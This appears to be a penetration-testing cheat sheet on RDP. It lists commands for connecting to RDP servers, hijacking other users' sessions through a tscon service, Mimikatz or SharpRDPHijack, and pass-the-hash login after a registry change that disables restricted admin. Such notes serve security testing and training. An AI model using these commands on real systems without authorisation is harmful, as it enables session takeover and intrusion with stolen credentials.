# RDP - T3389

{% hint style="info" %}
Connect to RDP servers on Linux using `xfreerdp`, `rdesktop`, or `Remmina`
{% endhint %}

### **Initiate RDP Session**

{% code lineNumbers="true" %}
```shellscript
xfreerdp /u:user /p:"password" /v:<IP>
rdesktop <IP> -d <domain> -u <user> -p <password>
```
{% endcode %}

### Exploitation

* #### Session Hijacking
  * When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.
  * **Using Native Windows Utility (`tscon.exe`)**
    * `query user`&#x20;
    * `sc create rdphijack binpath= "cmd.exe /k tscon <session_ID> /dest:<session_name>"`
    * `net start rdphijack`
  * **Using Task Manager (Requires Password)**
    * Task manager ->  Users -> Connect
  * **Mimikatz**
    * `mimikatz # ts::sessions`
    * `mimikatz # privilege::debug`
    * `mimikatz # token::elevate`
    * `mimikatz #  ts::remote /id:1<ID>`&#x20;
  * **Using SharpRDPHijack**
    * `SharpRDPHijack.exe --tsquery=localhost`
    * `SharpRDPHijack.exe --session=<SessionID>`&#x20;
* #### Pass-the-Hash (PtH) <a href="#rdp-pass-the-hash-pth" id="rdp-pass-the-hash-pth"></a>
  * `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` <sup><sub>(DisableRestrictedAdmin)<sub></sup>
  * `xfreerdp /v:<IP> /u:<user>/pth:<NTHash>`
